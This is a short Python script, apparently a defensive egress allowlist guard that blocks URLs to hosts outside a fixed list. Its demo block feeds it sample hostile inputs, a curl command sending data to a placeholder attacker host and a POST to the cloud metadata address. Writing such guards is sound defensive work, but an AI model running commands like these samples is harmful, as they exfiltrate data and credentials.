"""An egress allowlist guard against data exfiltration. Run:  python3 exfil_guard.py"""
import re

ALLOWED_HOSTS = {"github.com", "api.anthropic.com", "registry.npmjs.org"}


def find_egress(text):
    return re.findall(r"https?://([a-zA-Z0-9.-]+)", text)


def guard(action_text):
    for host in find_egress(action_text):
        if host not in ALLOWED_HOSTS:
            return {"allow": False, "reason": f"blocked egress to {host} (not allowlisted)"}
    return {"allow": True}


if __name__ == "__main__":
    print(guard("curl https://github.com/repo"))
    print(guard("curl https://evil.test/steal"))
    print(guard("POST data to http://169.254.169.254"))
